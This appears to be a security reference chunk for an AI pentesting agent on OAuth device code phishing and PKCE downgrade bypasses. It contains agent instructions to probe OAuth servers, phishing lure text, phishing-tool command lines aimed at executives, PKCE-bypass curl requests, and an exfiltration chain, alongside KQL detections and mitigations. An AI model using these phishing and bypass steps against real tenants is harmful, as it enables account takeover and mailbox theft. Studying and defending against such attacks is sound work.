# Device Code Phishing & PKCE Downgrade Attacks — Agent Chunk 74a
> Source: Proofpoint Threat Research 2025, RFC 8628 Device Authorization Grant, OWASP OAuth Security, Cloudflare CVE-2025-4144 Disclosure
> Purpose: Understand device code phishing campaigns targeting OAuth device authorization flows and PKCE downgrade attacks that bypass proof-key protections in OAuth authorization code flows
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Test OAuth implementations for device code flow abuse (is the flow enabled, does it have short expiry, does it require user interaction beyond code entry) and PKCE enforcement (does the server accept authorization code exchange without code_verifier when PKCE was initiated, does it fall back to plain challenge method). Check for device code flow availability even if not documented — it may be enabled by default. Test PKCE by initiating flow with code_challenge then omitting code_verifier in the token exchange.

---

## 1. Device Code Phishing

### 1.1 How Device Authorization Grant Works (RFC 8628)

The device code flow is designed for input-constrained devices (smart TVs, IoT, CLI tools) that cannot display a browser for interactive OAuth login.

```
1. Device → POST /oauth2/device/code
   Response: { device_code, user_code: "ABCD-1234", verification_uri, expires_in, interval }

2. Device displays: "Go to https://login.provider.com/device and enter code ABCD-1234"

3. User opens browser → navigates to verification_uri → enters user_code → authenticates → consents

4. Device polls: POST /oauth2/token { grant_type: device_code, device_code, client_id }
   Response (after user consents): { access_token, refresh_token }
```

### 1.2 The Phishing Attack

The attacker generates a device code and tricks the victim into authorizing it. The victim authenticates to their real identity provider — no fake login page is needed. This makes the attack highly convincing because the user sees the legitimate login page.

```
Attacker → POST /oauth2/device/code → receives device_code + user_code

Attacker → sends phishing email/message:
  "Your IT admin requires you to re-authenticate.
   Go to https://login.microsoftonline.com/common/oauth2/deviceauth
   and enter code: ABCD-1234"

Victim → opens REAL Microsoft login page → enters code → authenticates
         → grants OAuth consent (the consent screen may be skipped for first-party apps)

Attacker → polls /oauth2/token → receives victim's access_token + refresh_token
         → full account access
```

### 1.3 Proofpoint 2025 Campaigns

Proofpoint documented multiple device code phishing campaigns in 2025 targeting Microsoft 365 tenants:

**Campaign characteristics:**
- Targeted high-value accounts (executives, finance, IT admins)
- Used Microsoft's legitimate device auth endpoint (`login.microsoftonline.com/common/oauth2/deviceauth`)
- Phishing messages sent via compromised email accounts (not external)
- User codes embedded in QR codes and calendar invites
- Some campaigns used Microsoft Teams messages
- Access tokens used immediately for email exfiltration via Microsoft Graph API

**Timeline:** Devices codes expire in 15 minutes (Microsoft default). Attackers automated the flow: generate code, send phish, poll for token, begin exfiltration — all within the 15-minute window.

### 1.4 Attack Tools

**SquarePhish2:**
```bash
# SquarePhish2 — automated device code phishing for Microsoft 365
# Generates device code, sends phishing email, polls for tokens
python3 squarephish2.py \
  --client-id "d3590ed6-52b3-4102-aeff-aad2292ab01c" \  # Microsoft Office client ID
  --target-email "ceo@target.com" \
  --smtp-server compromised-smtp.com \
  --from "it-support@target.com"
```

**Graphish:**
```bash
# Graphish — leverages Microsoft Graph API for device code phishing
# Uses compromised account to send phishing messages via Teams/email
python3 graphish.py \
  --access-token "compromised-user-token" \
  --target "victim@target.com" \
  --method teams \
  --message "IT requires re-authentication. Enter code: {code}"
```

**Kali365:**
```bash
# Kali365 — comprehensive M365 attack framework with device code phishing
python3 kali365.py device-code \
  --tenant target.onmicrosoft.com \
  --client-id "d3590ed6-52b3-4102-aeff-aad2292ab01c" \
  --phish-via email \
  --target victim@target.com
```

### 1.5 Salesforce Removed Device Flow (September 2025)

Salesforce disabled the device authorization grant entirely in September 2025 due to the phishing risk, citing that the security risks outweighed the convenience. This is notable as a major platform-level response to device code phishing.

## 2. PKCE Downgrade Attacks

### 2.1 PKCE Overview

PKCE (RFC 7636) protects the authorization code flow against interception by binding the authorization request to the token exchange via a cryptographic proof:

```
1. Client generates: code_verifier (random 43-128 chars)
2. Client computes:  code_challenge = SHA256(code_verifier) (base64url-encoded)
3. Client → /authorize?code_challenge=<hash>&code_challenge_method=S256
4. Server issues authorization code bound to the code_challenge
5. Client → /token { code, code_verifier }
6. Server computes SHA256(code_verifier) and compares to stored code_challenge
7. Match → issue tokens; Mismatch → reject
```

### 2.2 Downgrade Attack: Omitting code_verifier

If the authorization server does not enforce PKCE when a code_challenge was provided, an attacker who intercepts the authorization code can exchange it without the code_verifier.

```bash
# Step 1: Legitimate client initiates flow with PKCE
GET /authorize?client_id=app&response_type=code&code_challenge=abc123&code_challenge_method=S256

# Step 2: Attacker intercepts the authorization code (via redirect_uri manipulation, referer leak, etc.)
# Authorization code: AUTH_CODE_XYZ

# Step 3: Attacker exchanges code WITHOUT code_verifier
POST /oauth2/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTH_CODE_XYZ&
client_id=app&
redirect_uri=https://app.com/callback
# NO code_verifier parameter

# If server issues tokens → PKCE downgrade vulnerability
```

### 2.3 CVE-2025-4144 — Cloudflare workers-oauth-provider (CVSS 9.1)

**Vulnerability:** The `workers-oauth-provider` package for Cloudflare Workers accepted token exchange requests without `code_verifier` even when the authorization request included `code_challenge`. This completely bypassed PKCE protection.

**Impact:** Any application using this package for OAuth was vulnerable to authorization code interception attacks, even though they implemented PKCE correctly on the client side.

**Affected:** `workers-oauth-provider` < 0.4.1.

**Reproduction:**
```bash
# 1. Start OAuth flow with PKCE (legitimate)
curl "https://auth.workers.dev/authorize?client_id=app&response_type=code&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256&redirect_uri=https://app.com/cb"

# 2. Intercept authorization code from redirect
# code=INTERCEPTED_CODE

# 3. Exchange WITHOUT code_verifier
curl -X POST https://auth.workers.dev/token \
  -d "grant_type=authorization_code" \
  -d "code=INTERCEPTED_CODE" \
  -d "client_id=app" \
  -d "redirect_uri=https://app.com/cb"
# Returns access_token — PKCE bypass successful
```

### 2.4 CVE-2023-48228 — Authlib PKCE Bypass

**Vulnerability:** Authlib (Python OAuth library) did not enforce PKCE validation when `code_challenge_method` was set to `plain` and `code_verifier` was omitted.

**Affected:** Authlib < 1.2.1.

### 2.5 CVE-2024-23647 — Authentik PKCE Bypass

**Vulnerability:** Authentik (identity provider) allowed token exchange without `code_verifier` for public clients even when `code_challenge` was provided in the authorization request.

**Attack flow:**
```
1. Legitimate app starts OAuth with PKCE → /authorize?code_challenge=X&code_challenge_method=S256
2. User authenticates, Authentik issues authorization code
3. Attacker intercepts code (via redirect_uri mismatch, open redirect, etc.)
4. Attacker exchanges code at /token without code_verifier
5. Authentik issues tokens without validating PKCE → account takeover
```

**Affected:** Authentik < 2024.1.2.

## 3. Attack Flow Steps

### 3.1 Device Code Phishing — Full Chain

```
Step 1: Reconnaissance
  - Identify target's OAuth provider (Azure AD, Google, Okta)
  - Check if device code flow is enabled
  - Identify first-party client IDs (no consent prompt)

Step 2: Code Generation
  POST /oauth2/device/code
  { client_id: "first-party-client-id", scope: "offline_access Mail.Read" }
  → { device_code, user_code: "GHIJ-5678", expires_in: 900 }

Step 3: Phishing Delivery
  Send user_code via email/Teams/SMS with urgent pretext
  
Step 4: Polling
  While not expired:
    POST /oauth2/token
    { grant_type: "urn:ietf:params:oauth:grant-type:device_code",
      device_code: "...", client_id: "..." }
    Wait interval seconds between polls

Step 5: Exfiltration
  Use access_token to call Microsoft Graph API
  GET /me/messages → email exfiltration
  GET /me/drive → OneDrive exfiltration
```

### 3.2 PKCE Downgrade — Full Chain

```
Step 1: Identify PKCE-protected flow (inspect /authorize request in browser)
Step 2: Obtain authorization code (redirect_uri manipulation, open redirect, referer leak)
Step 3: Attempt token exchange WITHOUT code_verifier
Step 4: If successful → PKCE is not enforced → authorization code interception = account takeover
```

## 4. Detection Indicators for Device Code Phishing

### 4.1 Azure AD / Entra ID

```kql
// Azure AD sign-in logs — detect device code authentication
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| where ResultType == 0  // Successful
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress,
          DeviceDetail, Location, ConditionalAccessStatus
| where AppDisplayName in ("Microsoft Office", "Microsoft Teams")
  // Suspicious: device code auth for browser-based apps
```

### 4.2 Network-Level Indicators

```
# High polling frequency to /oauth2/token with device_code grant type
# Same device_code polled from IP different from where user authenticated
# Device code authentication from unexpected geolocation
# Device code authentication for apps that normally use browser-based flows
```

### 4.3 Email/Messaging Indicators

```
# Emails containing verification URIs:
regex: https://(login\.microsoftonline\.com|accounts\.google\.com).*device
# Messages containing user codes (format varies by provider):
regex: [A-Z]{4}-[A-Z0-9]{4,6}
# QR codes that decode to device verification URIs
```

## 5. Mitigation

1. **Disable device code flow:** If not needed, disable it at the identity provider (Azure AD: Conditional Access policy to block device code flow).
2. **Require MFA for device code:** Apply conditional access requiring MFA or compliant device for device code auth.
3. **Short expiry:** Reduce device code expiry from 15 minutes to 5 minutes.
4. **Enforce PKCE server-side:** Reject token exchange without `code_verifier` when `code_challenge` was provided; require `S256` method.
5. **Monitor for device code auth:** Alert on device code authentications for applications that should not use this flow.
